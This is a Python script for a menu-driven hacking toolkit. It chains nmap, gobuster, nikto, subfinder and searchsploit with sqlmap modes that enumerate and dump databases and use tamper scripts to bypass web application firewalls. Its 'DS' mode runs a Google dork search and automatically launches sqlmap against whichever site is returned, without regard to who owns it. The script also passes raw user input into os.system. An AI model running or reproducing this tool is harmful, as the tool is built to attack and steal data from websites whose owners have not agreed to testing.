import os
import colorama
from subprocess import call
from colorama import Fore, Style
import datetime
from googlesearch import search, get_tbs

colorama.init(autoreset=True)

print(Fore.LIGHTGREEN_EX +""" 
========================================
           _       
          (_)      
 _ __ __ _ _ _ __  
| '__/ _` | | '_ \ 
| | | (_| | | | | |
|_|  \__,_|_|_| |_|
discord: rain#1000                
""")

print(Fore.LIGHTYELLOW_EX +"""
[1] advanced scan with nmap 
[2] directory hunter with gobuster
[3] admin login hunter with gobuster
[4] check vulns with nikto 
[5] check vulns with skipfish
[6] find subdomains with subfinder
[7] find info about target with whois 
[8] find exploits with searchsploit

// SQLMAP

[D] google hacking / dorks
[S] sqli with sqlmap 
[S2] dbs, --tables
[S3] dbs, tables, --dump
[S4] sql with sqlmap (advanced mode)
[DS] auto scan with dork & sqlmap
[WS] new window scan with sqlmap & dork (for linux only)

""")
at = input(Fore.LIGHTGREEN_EX +"option => ")

if at == "1" :
   atnmap = input("ip or url => ") 
   os.system("sudo nmap -sV -O -Pn -sS " + atnmap + "")
           
if at == "2" : 
   atw = input("url => ")
   atdir = input("wordlist dir => ")
   os.system("gobuster dir -u " + atw + " -w " + atdir + "") 

if at == "3" :
   atadm = input("url => ")
   atdir = input("wordlist dir => ")
   os.system("gobuster dir -u " + atadm + " -w " + atdir + "")

if at == "4" :
   atnikto = input("url => ") 
   os.system("nikto -h " + atnikto + "")
           
if at == "5" :
    atskipfish = input("url => ")
    os.system("skipfish -o fstscan " + atskipfish + "")
           
if at == "6" :
    atsubfinder = input("url => ")
    os.system("subfinder -d " + atsubfinder + "")
           
if at == "7" :
   atwhois = input ("domain => ")
   os.system("whois " + atwhois + "")
           
if at == "8" :
   atss = input("exploit => ")
   os.system("searchsploit " + atss +"")
           
if at == "S" :
   atsq1 = input("url => ")
   call(["sqlmap", atsq1 ,"--dbs", "--random-agent"])
   print(Fore.RED + '[URL]' + atsq1)

if at == "S2" :
   atsq3 = input("url => ")
   atdbn = input("database name => ") 
   call(["sqlmap", atsq3 ,"-D", atdbn, "--tables", "--random-agent"])
   print(Fore.RED + '[URL]', atsq3 + '\n' + '[DBS]', atdbn)
           
if at == "S3" :
   atsq4 = input("url => ")
   atdbn2 = input("database name => ") 
   attb = input("table name => ") 
   call(["sqlmap", atsq4,"-D", atdbn2, "-T", attb, "--dump", "--random-agent"])
   print(Fore.RED + '[URL]', atsq4 + '\n' + '[DBS]', atdbn2 + '\n' + '[TAB]', attb)

if at == "S4" :
   atsq2 = input("url =>")
   call(["sqlmap", atsq2 ,"--tamper=space2comment,between,space2plus", "-v 2", "--hex", "--random-agent", "--skip-waf", "--risk=3", "--level=3"])

if at == "D" :
   searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
   searchnumber = input(f'{Fore.GREEN}how many websites do u want? => {Fore.WHITE}')
   searchnumber = int(searchnumber)

   for i in search(
    searchterm, 
    tld="com", 
    num=searchnumber, 
    stop=searchnumber, 
    pause=2,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    print(Fore.RED + '[!]', Fore.LIGHTBLUE_EX + i)

if at == "DS" :
   searchterm = input(f'{Fore.GREEN}dork => {Fore.WHITE}')
   searchnumber = 1

   for i in search(
    searchterm, 
    tld="com", 
    num=searchnumber, 
    stop=searchnumber, 
    pause=2,
    tbs=get_tbs(
        datetime.date(2021, 1, 1),
        datetime.date(2022, 4, 1))
   ):
    print(Fore.RED +"[!] scanning: " + i)
    call(["sqlmap", i ,"--dbs", "--random-agent"])

if at == "WS" :
   os.system("konsole --hold -e  python sqlihunter.py")
